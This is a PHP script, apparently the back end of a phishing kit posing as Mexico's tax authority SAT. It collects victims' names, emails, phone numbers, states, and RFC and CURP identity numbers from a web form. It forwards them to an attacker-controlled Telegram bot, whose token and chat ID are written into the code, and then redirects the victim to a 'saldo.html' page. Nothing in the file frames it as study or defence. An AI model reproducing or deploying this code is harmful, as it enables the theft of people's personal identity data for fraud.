<?php 
error_reporting(0);
define ('url',"https://api.telegram.org/bot5158268829:AAF8xc22TgLd0-Rmw1GwP98EVcbAwFbIJYA");
$name = $_POST['name'];
$message = $_POST['mail'];
$chat_id = '1189170037';
$name = $_POST['name'];
$mail = $_POST['mail'];
$number = $_POST['number'];
$rfc = $_POST['rfc'];
$estado = $_POST['estado'];
$curp = $_POST['curp'];

$message = urlencode("NUEVOS DATOS RECIBIDOS PRIMERA PARTE \n\n⭐ Nombre: $name \n🪙 Email: $mail \n📞 Numero: $number \n🆔 RFC: $rfc \n🌐 Estado: $estado \n🧾 CURP: $curp \n\nATTE: SATReboot");
$mybar = file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");

#$arrayName = array('$mybar' => 1,);

if ($mybar['ok'] == 1) {
	# code...
	header("Location: saldo.html");
} 
